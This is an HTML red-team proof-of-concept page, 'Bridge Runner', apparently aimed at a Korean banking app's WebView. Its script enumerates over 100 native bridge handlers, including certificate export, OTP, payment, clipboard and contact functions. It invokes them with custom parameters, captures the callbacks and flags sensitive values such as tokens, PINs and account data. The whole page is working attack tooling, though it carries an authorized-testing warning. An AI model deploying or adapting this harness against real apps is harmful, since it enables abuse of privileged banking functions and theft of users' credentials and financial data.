<!doctype html>
<html lang="ko">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>REDTEAM PoC — Bridge Runner (대상 앱 테스트 전용)</title>
<style>
  body{font-family:-apple-system,system-ui,sans-serif;margin:0;padding:14px;background:#0b0b0d;color:#e6e6e6}
  h1{font-size:16px;color:#ff5c5c;margin:0 0 8px}
  .warn{background:#2a1a1a;border:1px solid #633;padding:9px;border-radius:8px;font-size:12px;margin:6px 0}
  .bar{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin:10px 0}
  input,select,textarea,button{font:13px -apple-system,system-ui,sans-serif}
  input,select,textarea{background:#141418;color:#e6e6e6;border:1px solid #333;border-radius:6px;padding:7px}
  textarea{width:100%;min-height:52px;box-sizing:border-box}
  button{background:#1f2937;color:#e6e6e6;border:1px solid #374151;border-radius:7px;padding:8px 10px;cursor:pointer}
  button:hover{background:#273449}
  button:disabled{opacity:.35;cursor:not-allowed}
  #grid{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
  #grid button{font-size:11px;padding:6px 8px}
  button.sens{border-color:#8a3b3b;color:#ff9b9b}
  button.ok{border-color:#2f6b43}
  .muted{color:#888}.ok{color:#4ade80}.bad{color:#ff6b6b}
  #log{white-space:pre-wrap;font:11px ui-monospace,Menlo,monospace;background:#141418;border-radius:8px;padding:11px;margin-top:12px;max-height:50vh;overflow:auto}
  .sec{margin-top:14px;border-top:1px solid #222;padding-top:10px}
  label{font-size:12px;color:#aaa}
</style>
</head>
<body>
<h1>REDTEAM PoC — Bridge Runner</h1>
<div class="warn">승인된 <b>대상 앱 테스트 전용</b>. 버튼을 누르면 해당 네이티브 인터페이스가 <b>실제 호출</b>됩니다(민감 핸들러는 확인창). 외부 배포·실사용자 대상 금지.</div>

<div class="bar">
  <button id="scan">① 핸들러 스캔</button>
  <input id="filter" placeholder="필터(예: Cert, Setting)" size="16">
  <span id="cnt" class="muted"></span>
</div>
<div id="grid"></div>

<div class="sec">
  <label>② 커스텀 실행 — 핸들러 선택 + 추가 파라미터(JSON)</label>
  <div class="bar">
    <select id="sel" style="min-width:220px"></select>
    <button id="run">실행</button>
  </div>
  <textarea id="params" placeholder='추가 파라미터 JSON (선택). 예: {"settingKey":"previousBioIssuedYesNo"}'></textarea>
</div>

<div id="log"></div>

<script>
const HANDLERS=["callSTT", "callArsPhone", "callShowLoading", "callLoadingViewShow", "callLoadingViewHide", "callWebViewOpen", "callWebViewClose", "callPhotoGallery", "callIDCardOcr", "callExternalWebView", "callappversion", "callphoneinfo", "callnativelogin", "callLogin", "callGetSetting", "callSetSetting", "callKbankSetSetting", "callKbankGetSetting", "callCreateUuid", "callMPKIBioCheck", "callMPKIIssue", "callGetClipBoardId", "callIsDeviceLock", "callMPKIIssueSave", "callMPKIDiscard", "callIsVoiceOver", "callMPKIgetAllInfo", "callMPKIBioRegComplete", "callGetClipBoard", "callStartApp", "callCheckScheme", "callSendSms", "callDeviceHaptic", "callIsCalling", "callMPKISignWithAttr", "callSaveImage", "callStatusBarStyle", "callMPKISign", "callCreateAutoLoginUuid", "callMPKIgetBioSignature", "callGetContact", "callCertList", "callKbankHaptic", "callSaveAutoLoginUuid", "callExternalSetting", "callExistAutoLoginUuid", "callShareSns", "callSendMore", "callKbankShare", "callCommonCertInfo", "callDeleteAutoLoginUuid", "callUserLogout", "callCommonCertUpdate", "callMotpSavePassword", "callCommonCertIssue", "callShowAppStoreRatingPopup", "callCommonCertImport", "callCertConfirmArray", "callCertDelete", "callCommonCertExport", "callContact", "callContactMulti", "callOpenBrowser", "callMotpKeyChangePassword", "callMotpNumber", "callMobileIDApp", "callMotpKeyChange", "callGetPushSettings", "callTransferWidget", "callPageFinished", "callCommonCertPasswordChange", "callSetPushSettings", "callMotpDelete", "callMotpCheckPw", "callMotpExist", "callNormalSaveFile", "callSimpleCertList", "callSimpleCertIssue", "callWebViewLoad", "callCacheClear", "callRequestFdsCollectionServer", "callSimpleCertCheckPin", "callSimpleCertPasswordChange", "callSimpleCertDelete", "callKeypad", "callFaceAuth", "callAppIronAuth", "callScrapingMulti", "callScrapingBig", "callCloseKeypad", "callOtacGetRegistrationMessage", "callOtacRegister", "callOtacGetVerifyMessage", "callOtacDeregister", "callCertUbikey", "calllogout", "callSaveFile", "callQRScan", "callCertUbikeySave", "callNativeRestAPI", "callCertPdfSign", "callEzl", "callPayCodeCreate", "callZeroPayRsltReq", "callZeroPayTranReq", "callNonLoginPay", "callSetBrightness", "callFlowControlState", "callShowMiniGame", "callShowRewardVideo", "callGetColorTheme", "callSetColorTheme", "callGetLanguage", "callSetLanguage", "callGetSteps", "callShareSNS", "callSetStatusBarFontColor", "callCommonCertPwdChange", "callRequestFDSCollectionServer", "callOTACRegister", "callOTACDeregister", "callOTACGetRegistrationMessage", "callOTACGetVerificationMessage"];
const INPUTS={"callKbankGetSetting": {"settingKey": "previousBioIssuedYesNo"}, "callGetSetting": {"settingkey": "previousBioIssuedYesNo", "key": "previousBioIssuedYesNo"}};
const SENS=/sign|pay|cert|mpki|motp|otac|login|logout|issue|delete|save|keypad|scraping|setsetting|setpush|bio|faceauth|appiron|nativerest|startapp|brightness/i;
const L=(s,c)=>{const d=document.getElementById('log');d.innerHTML=(c?`<span class="${c}">${s}</span>`:s)+"\n"+d.innerHTML;};
function fmt(a){try{return(a&&typeof a==="object")?JSON.stringify(a):String(a);}catch(e){return String(a);}}
const SENSV=/custid|cust_id|member|userid|uuid|phone|mobile|ssn|jumin|birth|account|balance|cert|token|signature|sign|clip|session|cookie|pin|passw|bio|otp|motp|mpki|card|regi/i;
function showResp(name,args){const v=args.map(fmt),j=v.join(" | ");const sens=SENSV.test(name+" "+j);
  L(`[응답] ${name}(${args.length}) = ${j.slice(0,6000)}`+(sens?"  ⚠️ 민감값!":""),sens?"bad":"ok");}
function cbFields(cb){return{callBackId:cb,callBackParam1:"P1",callBackParam2:"P2",callBackParam3:"P3",callBackParam4:"P4",callBackParam5:"P5",callback:cb,callbackId:cb};}
// 고정 콜백명도 정의(혹시 모를 변형)
["nativeCallback","bridgeCallback","callback","kbankCallback","resultCallback","__rt","onResult"].forEach(n=>{try{window[n]=(...a)=>showResp(n,a);}catch(e){}});
const mh=(window.webkit&&window.webkit.messageHandlers)||{};
function present(h){try{return !!mh[h];}catch(e){return false;}}

// 핸들러 실행
function callHandler(h,extraRaw){
  if(!present(h)){L(`[실행] ${h}: 이 웹뷰에 핸들러 없음`,"muted");return;}
  if(SENS.test(h) && !confirm(`[민감 핸들러] ${h} 를 호출합니다.\n유효 거래/서명 값은 넣지 않지만 네이티브 흐름이 트리거될 수 있습니다. 진행?`))return;
  const cb="cb_"+h.replace(/[^A-Za-z0-9]/g,"");
  try{window[cb]=(...a)=>showResp(h,a);}catch(e){}
  let extra={};
  if(extraRaw){try{extra=JSON.parse(extraRaw);}catch(e){L("추가 파라미터 JSON 파싱 실패: "+e,"bad");return;}}
  const body=Object.assign({}, INPUTS[h]||{}, extra, cbFields(cb));
  try{mh[h].postMessage(JSON.stringify(body));L(`[실행] ${h} 전송 → 응답 오면 [응답] 표시  body=${JSON.stringify(body).slice(0,200)}`,"ok");}
  catch(e){L(`[실행] ${h} 실패: ${e}`,"bad");}
}

// 스캔 + 버튼 렌더
function scan(){
  const f=document.getElementById('filter').value.toLowerCase();
  const grid=document.getElementById('grid'); grid.innerHTML="";
  const sel=document.getElementById('sel'); sel.innerHTML="";
  let reg=0,shown=0;
  HANDLERS.forEach(h=>{
    const on=present(h); if(on)reg++;
    if(f && h.toLowerCase().indexOf(f)<0) return;
    shown++;
    const b=document.createElement('button');
    b.textContent=(on?"":"∅ ")+h;
    b.className=(on?"ok ":"")+(SENS.test(h)?"sens":"");
    b.disabled=!on;
    b.onclick=()=>callHandler(h, document.getElementById('params').value.trim());
    grid.appendChild(b);
    if(on){const o=document.createElement('option');o.value=h;o.textContent=h;sel.appendChild(o);}
  });
  document.getElementById('cnt').textContent=`등록 ${reg}/${HANDLERS.length}개 · 표시 ${shown}`;
  L(`[스캔] 이 웹뷰 등록 핸들러 ${reg}/${HANDLERS.length}개. 버튼(초록=등록, ∅=없음, 빨강=민감)`,reg?"bad":"muted");
}

document.getElementById('scan').onclick=scan;
document.getElementById('filter').oninput=scan;
document.getElementById('run').onclick=()=>{const h=document.getElementById('sel').value; if(h)callHandler(h, document.getElementById('params').value.trim());};
L("오리진: "+location.href+"  — ① 스캔 → 버튼 클릭으로 인터페이스 실행","muted");
scan();
</script>
</body>
</html>
